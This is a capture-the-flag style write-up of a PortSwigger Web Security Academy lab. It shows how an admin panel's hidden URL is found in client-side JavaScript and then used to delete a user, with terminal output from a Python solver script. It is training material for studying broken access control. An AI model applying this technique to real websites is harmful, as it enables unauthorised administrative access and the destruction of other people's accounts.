# Lab: Unprotected admin functionality with unpredictable URL

### Instructions

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user `carlos`. 

### Solution

Looking at the page source of the application we find:

```javascript
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-syqkk5');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
```

We can use this to access the admin panel at: `https://0a2d007d031b46e882e46f6300cc00e5.web-security-academy.net/admin-syqkk5`

Which allows us to delete the user carlos and solve the lab:

```
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `access_control_02.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_02_unprotected_admin_functionality_with_unpredictable_url]
└─$ python access_control_02.py https://0a7400be03e18aa7808fd55700ec0022.web-security-academy.net/
[*] Finding the admin panel endpoint...
[+] The admin panel is located at: https://0a7400be03e18aa7808fd55700ec0022.web-security-academy.net/admin-7rqpvo
[*] Deleting Carlos...
[+] Deleted Carlos... Lab solved
```